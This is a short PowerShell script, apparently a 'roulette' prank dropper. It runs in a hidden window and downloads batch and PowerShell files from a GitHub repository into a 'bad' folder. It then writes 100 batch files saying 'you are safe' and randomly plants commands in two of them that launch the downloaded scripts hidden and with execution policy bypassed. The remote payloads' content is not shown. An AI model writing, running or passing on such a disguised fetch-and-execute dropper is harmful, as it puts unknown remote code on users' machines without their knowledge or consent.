powershell.exe -windowstyle hidden {
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/start.bat -OutFile .\start.bat
mkdir odds
cd odds
For ($i=1; $i -le 100; $i++) {
Add-Content .\$i.bat "`n@echo off"
Add-Content .\$i.bat "`necho you are safe"
Add-Content .\$i.bat "`necho but run again for the boiiissss"
Add-Content .\$i.bat "`ntimeout 3 >nul 2>nul"
}
$num = Get-Random -Maximum 101 -Minimum 1
Add-Content .\$num.bat "`ncd bad"
Add-Content .\$num.bat "`npowershell -ExecutionPolicy Bypass -File odds.ps1 -windowstyle hidden"
$num = Get-Random -Maximum 101 -Minimum 1
Add-Content .\$num.bat "`ncd bad"
Add-Content .\$num.bat "`nstart *.bat"
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/dice.ps1 -OutFile .\dice.ps1
mkdir bad
cd bad
For ($i=1; $i -le 9; $i++) {
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/bad/$i.bat -OutFile .\$i.bat
}
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Roulette/bad/odds.ps1 -OutFile .\odds.ps1
}
